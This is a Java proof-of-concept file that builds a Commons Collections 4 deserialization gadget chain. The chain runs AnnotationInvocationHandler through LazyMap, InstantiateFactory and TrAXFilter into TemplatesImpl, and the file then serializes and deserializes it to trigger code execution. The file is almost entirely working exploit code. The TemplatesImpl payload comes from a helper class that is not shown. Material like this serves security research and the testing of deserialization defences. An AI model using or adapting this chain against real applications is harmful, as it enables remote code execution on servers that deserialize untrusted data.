package com.example.CC4;

import com.example.Utils.ReflectionUtil;
import com.example.Utils.SerializeUtil;
import com.example.Utils.Share;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import org.apache.commons.collections4.map.LazyMap;
import org.apache.commons.collections4.functors.FactoryTransformer;
import org.apache.commons.collections4.functors.InstantiateFactory;

import javax.xml.transform.Templates;
import java.lang.annotation.Retention;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.Map;

public class POC_1 {

    /***
     * <sun.reflect.annotation.AnnotationInvocationHandler: void readObject(java.io.ObjectInputStream)>
     * <sun.reflect.annotation.AnnotationInvocationHandler: java.lang.Object invoke(java.lang.Object,java.lang.reflect.Method,java.lang.Object[])>
     * <org.apache.commons.collections4.map.LazyMap: java.lang.Object get(java.lang.Object)>
     * <org.apache.commons.collections4.functors.FactoryTransformer: java.lang.Object transform(java.lang.Object)>
     * <org.apache.commons.collections4.functors.InstantiateFactory: java.lang.Object create()>
     * <com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter: void <init>(javax.xml.transform.Templates)>
     * <com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl: javax.xml.transform.Transformer newTransformer(javax.xml.transform.Templates)>
     * <com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl: com.sun.org.apache.xalan.internal.xsltc.Translet getTransletInstance(javax.xml.transform.Templates)>
     * <java.lang.reflect.Constructor: java.lang.Object newInstance(java.lang.Object[])>
     */

    public static void main(String[] args) throws Exception {
        InstantiateFactory factory = new InstantiateFactory<>(TrAXFilter.class, new Class[]{Templates.class}, new Object[]{Share.getTemplatesImplObj()});
        FactoryTransformer factoryTransformer = new FactoryTransformer<>(factory);

        Map innerMap = new HashMap();
        Map outerMap = LazyMap.lazyMap(innerMap, factoryTransformer);

        InvocationHandler handler = (InvocationHandler) ReflectionUtil.createObject("sun.reflect.annotation.AnnotationInvocationHandler",
                new Class[]{Class.class, Map.class},
                new Object[]{Retention.class, outerMap});

        Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(),new Class[]{Map.class}, handler);

        handler = (InvocationHandler) ReflectionUtil.createObject("sun.reflect.annotation.AnnotationInvocationHandler",
                new Class[]{Class.class, Map.class},
                new Object[]{Retention.class, proxyMap});

        SerializeUtil.deserialize(SerializeUtil.serialize(handler));
    }

}
